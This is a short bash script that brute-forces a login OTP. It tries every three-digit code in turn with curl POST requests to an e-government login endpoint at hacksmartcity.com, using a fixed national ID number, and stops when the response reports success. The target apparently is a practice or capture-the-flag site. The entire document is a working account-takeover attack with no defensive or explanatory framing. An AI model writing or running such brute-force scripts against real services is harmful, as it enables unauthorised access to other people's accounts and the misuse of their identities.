#!/bin/bash

nid="784-1978-8264760-1"

for otp in $(seq -w 000 999); do
  echo "[-] Trying OTP: $otp"

  response=$(curl -s -X POST https://hacksmartcity.com/egov/login/ \
    -H "Content-Type: application/json" \
    -d "{\"nid\":\"$nid\",\"otp\":\"$otp\"}")

  if [[ $response == *'"result":true'* ]]; then
    echo "[+] ✅ SUCCESS! OTP is $otp"
    echo "Response: $response"
    break
  fi
done

